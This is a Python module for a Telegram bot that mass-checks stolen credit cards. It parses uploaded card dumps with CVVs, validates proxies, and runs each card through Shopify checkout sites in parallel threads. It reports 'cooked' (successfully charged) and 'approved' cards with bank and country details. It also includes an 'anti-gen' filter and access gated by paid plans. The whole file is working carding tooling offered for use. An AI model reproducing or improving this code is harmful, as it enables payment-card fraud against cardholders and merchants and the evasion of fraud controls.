import requests
import time
import threading
import random
import logging
import re
import csv
import os
import json
import socket
import urllib3
import traceback
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from shopify_checker import check_site_shopify_direct, process_response_shopify  

# ============================================================================
# 🛠️ SYSTEM CONFIGURATION
# ============================================================================

# Disable SSL Warnings to keep console clean
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure Logging with Timestamp for debugging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ============================================================================
# ⚙️ GLOBAL VARIABLES & SETTINGS
# ============================================================================

# User Session Storage
# Structure: { user_id: { 'ccs': [], 'proxies': [], 'file_content': '', 'session_active': False } }
user_sessions = {} 

# File Paths
CCS_FILE = 'data/credit_cards.json'
PROXIES_FILE = 'proxies.json'
BINS_CSV_FILE = 'bins_all.csv' 
DARKS_ID = 5963548505 

# Security & Optimization Settings
ANTI_GEN_THRESHOLD = 0.80   # If >80% of cards share the same BIN, block file
ANTI_GEN_MIN_CARDS = 10     # Minimum cards required to trigger Anti-Gen check
MAX_RETRIES = 2             # Retries per card if connection/site fails
PROXY_TIMEOUT = 5           # Timeout for proxy validation (Fast = 5s)
REQUEST_TIMEOUT = 40        # Timeout for gateway response

# Global BIN Database Cache
BIN_DB = {}

# ============================================================================
# 📂 CSV BIN DATABASE LOADER
# ============================================================================

def load_bin_database():
    """
    Loads the BIN database from CSV into memory on startup.
    This provides instant Bank/Country/Level info without hitting external APIs.
    """
    global BIN_DB
    
    if not os.path.exists(BINS_CSV_FILE):
        logger.warning(f"⚠️ System: BIN CSV file '{BINS_CSV_FILE}' not found. Hits will lack details.")
        return

    try:
        print(f"⏳ System: Loading BIN database from {BINS_CSV_FILE}...")
        start_time = time.time()
        
        with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f)
            
            # Skip the header row
            next(reader, None)
            
            count = 0
            for row in reader:
                # Ensure the row has enough columns to prevent index errors
                if len(row) >= 6:
                    bin_code = row[0].strip()
                    
                    # Store data structure
                    BIN_DB[bin_code] = {
                        'country_name': row[1].strip(),
                        'country_flag': get_flag_emoji(row[1].strip()),
                        'brand': row[2].strip(),
                        'type': row[3].strip(),
                        'level': row[4].strip(),
                        'bank': row[5].strip()
                    }
                    count += 1
                    
        elapsed = time.time() - start_time
        print(f"✅ System: Successfully loaded {count} BINs in {elapsed:.2f}s")
        
    except Exception as e:
        logger.error(f"❌ System: Critical Error loading BIN CSV: {e}")

def get_flag_emoji(country_code):
    """Converts a 2-letter country code (e.g., US) to a flag emoji (🇺🇸)"""
    if not country_code or len(country_code) != 2:
        return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])

# Initialize Database Immediately
load_bin_database()

# ============================================================================
# 🛠️ HELPER FUNCTIONS (Extraction & formatting)
# ============================================================================

def get_bin_info(card_number):
    """
    Retrieves BIN information for a card.
    Priority:
    1. Local CSV Database (Instant, No Rate Limit)
    2. Online API (Fallback, Slower)
    3. Default Unknown (If both fail)
    """
    if not card_number:
        return {}
    
    # Clean Card Number and get first 6 digits
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]
    
    # 1. Local Lookup
    if bin_code in BIN_DB:
        return BIN_DB[bin_code]

    # 2. API Fallback (Only if not in CSV)
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except:
        pass
    
    # 3. Default Return
    return {
        'country_name': 'Unknown',
        'country_flag': '🇺🇳',
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN',
        'bank': 'UNKNOWN'
    }

def extract_cards_from_text(text):
    """
    Extracts valid Credit Cards from raw text input.
    Supports formats: Pipe, Colon, Slash, Spaces, Mixed text.
    Auto-corrects: 2-digit years and 1-digit months.
    """
    valid_ccs = []
    
    # Normalize separators to newlines
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if len(line) < 15: continue # Skip lines that are clearly too short
        
        # Regex for CC|MM|YY|CVV
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            
            # Normalize Year (e.g., 24 -> 2024)
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            
            # Normalize Month (e.g., 1 -> 01)
            mm = mm.zfill(2)
            
            # Basic Logic Check
            if not (1 <= int(mm) <= 12): continue
            
            full_cc = f"{cc}|{mm}|{yyyy}|{cvv}"
            valid_ccs.append(full_cc)
            
    # Remove duplicates
    return list(set(valid_ccs))

def extract_proxies_from_text(text):
    """
    Extracts proxies from raw text.
    Supports formats: IP:Port and IP:Port:User:Pass
    """
    valid_proxies = []
    lines = text.replace(',', '\n').split('\n')
    
    for line in lines:
        line = line.strip()
        # Basic Validation: Must contain colon and look like a proxy
        if ':' in line:
            parts = line.split(':')
            if len(parts) >= 2:
                valid_proxies.append(line)
                
    return list(set(valid_proxies))

def create_progress_bar(processed, total, length=15):
    """Generates a visual progress bar string for Telegram"""
    if total == 0: return ""
    percent = processed / total
    filled_length = int(length * percent)
    
    bar_filled = '█' * filled_length
    bar_empty = '░' * (length - filled_length)
    
    return f"<code>{bar_filled}{bar_empty}</code> {int(percent * 100)}%"

# ============================================================================
# 🚨 STRICT PROXY VALIDATION ENGINE
# ============================================================================

def validate_proxies_strict(proxies, bot, message):
    """
    Strictly validates proxies before Mass Check starts.
    Returns: A list of ONLY live proxies.
    """
    live_proxies = []
    total = len(proxies)
    checked = 0
    
    # Send Initial Status Message
    status_msg = bot.reply_to(
        message, 
        f"🛡️ <b>System: Verifying {total} Proxies...</b>\n\n"
        f"<i>Testing connectivity...</i>", 
        parse_mode='HTML'
    )
    
    last_ui_update = time.time()

    def check_single_proxy_connection(proxy_str):
        try:
            # Format Proxy URL correctly
            parts = proxy_str.split(':')
            if len(parts) == 2:
                # IP:Port
                proxy_url = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                # IP:Port:User:Pass
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                return False

            proxies_dict = {'http': proxy_url, 'https': proxy_url}
            
            # Send request to a fast, reliable endpoint
            response = requests.get(
                "http://httpbin.org/ip", 
                proxies=proxies_dict, 
                timeout=PROXY_TIMEOUT
            )
            
            if response.status_code == 200:
                return True
        except:
            return False
        return False

    # Execute checks in parallel threads for speed
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_single_proxy_connection, p): p for p in proxies}
        
        for future in as_completed(futures):
            checked += 1
            is_live = future.result()
            proxy = futures[future]
            
            if is_live:
                live_proxies.append(proxy)
            
            # Update UI every 2 seconds to avoid flood limits
            if time.time() - last_ui_update > 2:
                try:
                    bot.edit_message_text(
                        f"🛡️ <b>System: Verifying Proxies</b>\n\n"
                        f"✅ <b>Live:</b> {len(live_proxies)}\n"
                        f"💀 <b>Dead:</b> {checked - len(live_proxies)}\n"
                        f"📊 <b>Progress:</b> {checked}/{total}\n\n"
                        f"<i>Please wait while we filter the pool...</i>",
                        message.chat.id, status_msg.message_id, parse_mode='HTML'
                    )
                    last_ui_update = time.time()
                except:
                    pass

    # Cleanup Status Message
    try:
        bot.delete_message(message.chat.id, status_msg.message_id)
    except:
        pass
    
    return live_proxies

# ============================================================================
# 🚀 MAIN BOT HANDLER SETUP
# ============================================================================

def setup_complete_handler(bot, get_filtered_sites_func, proxies_data, 
                          check_site_func, is_valid_response_func, 
                          process_response_func, update_stats_func, save_json_func,
                          is_user_allowed_func):
    
    # ------------------------------------------------------------------------
    # 1. FILE UPLOAD LISTENER
    # ------------------------------------------------------------------------
    @bot.message_handler(content_types=['document'])
    def handle_file_upload_event(message):
        # --- SECURITY CHECK ---
        if not is_user_allowed_func(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> You are not authorized or your plan has expired.", parse_mode='HTML')
            return
        # ----------------------

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                bot.reply_to(message, "❌ <b>Format Error:</b> Only .txt files are allowed.", parse_mode='HTML')
                return

            msg_loading = bot.reply_to(message, "⏳ <b>Downloading...</b>", parse_mode='HTML')
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            
            user_id = message.from_user.id
            if user_id not in user_sessions:
                user_sessions[user_id] = {'ccs': [], 'proxies': [], 'file_content': ''}
            
            user_sessions[user_id]['file_content'] = file_content

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("💳 Load as CCs", callback_data="action_load_cc"),
                types.InlineKeyboardButton("🔌 Load as Proxies", callback_data="action_load_proxy"),
                types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
            )
            
            bot.edit_message_text(
                f"📂 <b>File Received:</b> <code>{file_name}</code>\n"
                f"💾 <b>Size:</b> {len(file_content)} bytes\n\n"
                f"Select Action:", 
                message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
            )

        except Exception as e:
            logger.error(f"File Upload Error: {e}")
            bot.reply_to(message, f"❌ <b>Upload failed:</b> {str(e)}", parse_mode='HTML')

    # ------------------------------------------------------------------------
    # 2. CALLBACK QUERY HANDLER
    # ------------------------------------------------------------------------
    @bot.callback_query_handler(func=lambda call: call.data.startswith('action_'))
    def handle_file_action_buttons(call):
        # --- SECURITY CHECK ---
        if not is_user_allowed_func(call.from_user.id):
            bot.answer_callback_query(call.id, "🚫 Access Denied")
            return
        # ----------------------

        user_id = call.from_user.id
        action = call.data
        
        if user_id not in user_sessions or not user_sessions[user_id].get('file_content'):
            bot.answer_callback_query(call.id, "❌ Session expired.")
            return
            
        content = user_sessions[user_id]['file_content']
        
        if action == "action_cancel":
            user_sessions[user_id]['file_content'] = "" 
            bot.delete_message(call.message.chat.id, call.message.message_id)
            return

        elif action == "action_load_proxy":
            proxies = extract_proxies_from_text(content)
            if not proxies:
                bot.answer_callback_query(call.id, "❌ No proxies found!", show_alert=True)
                return
            
            user_sessions[user_id]['proxies'] = proxies
            user_sessions[user_id]['file_content'] = ""
            
            # Add to server pool
            for p in proxies:
                if p not in proxies_data['proxies']: proxies_data['proxies'].append(p)
            save_json_func('proxies.json', proxies_data)

            bot.edit_message_text(f"🔌 <b>Proxies Loaded:</b> {len(proxies)}", call.message.chat.id, call.message.message_id, parse_mode='HTML')

        elif action == "action_load_cc":
            ccs = extract_cards_from_text(content)
            if not ccs:
                bot.answer_callback_query(call.id, "❌ No CCs found!", show_alert=True)
                return

            # Anti-Gen Check
            if len(ccs) >= ANTI_GEN_MIN_CARDS:
                bins = [cc.split('|')[0][:6] for cc in ccs]
                mc = Counter(bins).most_common(1)[0]
                if (mc[1] / len(ccs)) > ANTI_GEN_THRESHOLD:
                    bot.edit_message_text(f"🚫 <b>ANTI-GEN:</b> BIN {mc[0]} Rejected.", call.message.chat.id, call.message.message_id, parse_mode='HTML')
                    return

            user_sessions[user_id]['ccs'] = ccs
            user_sessions[user_id]['file_content'] = "" 
            bot.edit_message_text(f"✅ <b>CCs Loaded:</b> {len(ccs)}\nType /msh to start.", call.message.chat.id, call.message.message_id, parse_mode='HTML')

    # ------------------------------------------------------------------------
    # 3. MASS CHECK COMMAND (/msh)
    # ------------------------------------------------------------------------
    @bot.message_handler(commands=['msh', 'hardcook'])
    def handle_mass_check_command(message):
        # --- SECURITY CHECK ---
        if not is_user_allowed_func(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> You are not authorized or your plan has expired.", parse_mode='HTML')
            return
        # ----------------------

        user_id = message.from_user.id
        
        if user_id not in user_sessions or not user_sessions[user_id]['ccs']:
            bot.reply_to(message, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
            return
        
        ccs = user_sessions[user_id]['ccs']
        sites = get_filtered_sites_func()
        
        if not sites:
            bot.reply_to(message, "❌ <b>No sites available!</b>", parse_mode='HTML')
            return
        
        user_proxies = user_sessions[user_id].get('proxies', [])
        
        if user_proxies:
            active_proxies = validate_proxies_strict(user_proxies, bot, message)
            if not active_proxies:
                bot.reply_to(message, "❌ <b>Mass Check Cancelled:</b> All user proxies DEAD.", parse_mode='HTML')
                return
            source = f"🔒 User ({len(active_proxies)})"
        else:
            active_proxies = proxies_data.get('proxies', [])
            if not active_proxies:
                bot.reply_to(message, "❌ <b>No Server Proxies!</b>", parse_mode='HTML')
                return
            source = "🌍 Server"

        start_msg = bot.reply_to(message, f"🔥 <b>Starting...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies ({source})", parse_mode='HTML')

        threading.Thread(
            target=process_mass_check_engine,
            args=(bot, message, start_msg, ccs, sites, active_proxies, 
                  check_site_func, process_response_func, update_stats_func)
        ).start()
# ============================================================================
# 🧠 MASS CHECK ENGINE (WORKER LOGIC)
# ============================================================================

def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_site_func, process_response_func, update_stats_func):
    """
    The core engine that processes cards.
    Handles Retries, Errors, and Approvals.
    """
    results = {
        'cooked': [],
        'approved': [],
        'declined': [],
        'error': []
    }
    
    total = len(ccs)
    processed = 0
    start_time = time.time()
    last_update_time = time.time()
    
    # --- WORKER FUNCTION ---
    def worker_check_single_card(cc):
        # We try MAX_RETRIES times per card.
        # This prevents marking a good card as dead just because a site/proxy failed once.
        
        attempts = 0
        random.shuffle(sites) # Randomize sites for each card
        
        while attempts < MAX_RETRIES:
            try:
                # Pick Resources
                site = sites[attempts % len(sites)]
                proxy = random.choice(proxies)
                
                # Execute Check
                # check_site_func returns JSON dict if successful, None if failed
                api_response = check_site_shopify_direct(site['url'], cc, proxy)
                
                # 1. Network/Proxy Failure -> Retry
                if not api_response:
                    attempts += 1
                    continue
                
                # Process Response
                response_text, status, gateway = process_response_func(api_response, site.get('price', '0'))
                
                # 2. SMART ERROR DETECTION -> Retry
                # If site returns garbage or gateway error, do not count as "Declined"
                # This fixes the "CLINTE TOKEN" issue you mentioned
                bad_keywords = ["CAPTCHA", "RATE LIMIT", "PROXY", "TIMEOUT", "CONNECTION"]
                
                is_site_error = any(keyword in response_text.upper() for keyword in bad_keywords)
                
                if is_site_error or status == "ERROR":
                    attempts += 1
                    continue # Retry with a different site
                
                # 3. Valid Result Found (Approved/Declined) -> Return
                return {
                    'cc': cc,
                    'status': status,
                    'response': response_text,
                    'gateway': gateway,
                    'price': site.get('price', '0'),
                    'site_url': site['url']
                }
                
            except Exception:
                attempts += 1
                
        # If we reach here, all attempts failed (True Dead)
        return {
            'cc': cc,
            'status': 'ERROR',
            'response': 'Dead Proxy/Site Limit',
            'gateway': 'Unknown',
            'price': '0',
            'site_url': 'N/A'
        }

    # --- EXECUTION POOL ---
    with ThreadPoolExecutor(max_workers=25) as executor:
        futures = {executor.submit(worker_check_single_card, cc): cc for cc in ccs}
        
        for future in as_completed(futures):
            processed += 1
            try:
                result = future.result()
                status = result['status']
                
                # Categorize Result - FIXED
                response_upper = result['response'].upper()

                if status == 'APPROVED':
                    # Check if response text indicates a successful charge (COOKED)
                    if any(x in response_upper for x in ["THANK YOU", "CONFIRMED", "SUCCESSFUL", "PURCHASE"]):
                        results['cooked'].append(result)
                        update_stats_func('COOKED', True)
                        send_hit_notification(bot, message.chat.id, result, "🔥 COOKED")
                    else:
                        # Otherwise, it is just Insufficient Funds (APPROVED)
                        results['approved'].append(result)
                        update_stats_func('APPROVED', True)
                        send_hit_notification(bot, message.chat.id, result, "✅ APPROVED")
                    
                elif status == 'APPROVED_OTP':
                    results['approved'].append(result)
                    update_stats_func('APPROVED_OTP', True)
                    send_hit_notification(bot, message.chat.id, result, "✅ APPROVED (OTP)")
                    
                elif status == 'DECLINED':
                    results['declined'].append(result)
                    update_stats_func('DECLINED', True)
                    
                else:
                    results['error'].append(result)
                
                # Update UI (Throttled: Every 3s)
                if time.time() - last_update_time > 3 or processed == total:
                    update_progress_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                    last_update_time = time.time()
                    
            except Exception as e:
                logger.error(f"Worker Error: {e}")

    # --- FINAL SUMMARY ---
    duration = time.time() - start_time
    send_final_report(bot, message.chat.id, status_msg.message_id, total, results, duration)

# ============================================================================
# 📩 MESSAGING SYSTEM (Beautiful Outputs)
# ============================================================================

def send_hit_notification(bot, chat_id, res, title):
    """Sends a detailed hit message with Site, Bank, Country, Gateway"""
    try:
        # Get BIN Details
        bin_info = get_bin_info(res['cc'])
        
        # Clean Site URL for display
        site_clean = res['site_url']
        if 'http' in site_clean:
            try:
                site_clean = site_clean.replace('https://', '').replace('http://', '').split('/')[0]
            except: pass

        msg = f"""
┏━━━━━━━⍟
┃ <b>{title} HIT!</b>
┗━━━━━━━━━━━⊛

💳 <b>Card:</b> <code>{res['cc']}</code>
💰 <b>Status:</b> {res['response']}
💲 <b>Amount:</b> ${res['price']}
🌐 <b>Site:</b> {site_clean}
🔌 <b>Gateway:</b> {res['gateway']}

🏳️ <b>Country:</b> {bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '')}
🏦 <b>Bank:</b> {bin_info.get('bank', 'Unknown')}
💳 <b>Type:</b> {bin_info.get('level', '')} {bin_info.get('type', '')}

━━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(chat_id, msg, parse_mode='HTML')
    except: pass

def update_progress_ui(bot, chat_id, mid, processed, total, results):
    """Updates the live progress bar message"""
    try:
        bar = create_progress_bar(processed, total)
        msg = f"""
┏━━━━━━━⍟
┃ <b>⚡ MASS CHECKING...</b>
┗━━━━━━━━━━━⊛

{bar}
<b>Progress:</b> {processed}/{total}

🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
⚠️ <b>Errors:</b> {len(results['error'])}

<i>Engine running...</i>
"""
        bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
    except: pass

def send_final_report(bot, chat_id, mid, total, results, duration):
    """Sends the final summary report"""
    msg = f"""
┏━━━━━━━⍟
┃ <b>✅ CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛

🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
⚠️ <b>Errors:</b> {len(results['error'])}

<b>Total Checked:</b> {total}
<b>Time Taken:</b> {duration:.2f}s
"""
    try:
        bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
    except:
        bot.send_message(chat_id, msg, parse_mode='HTML')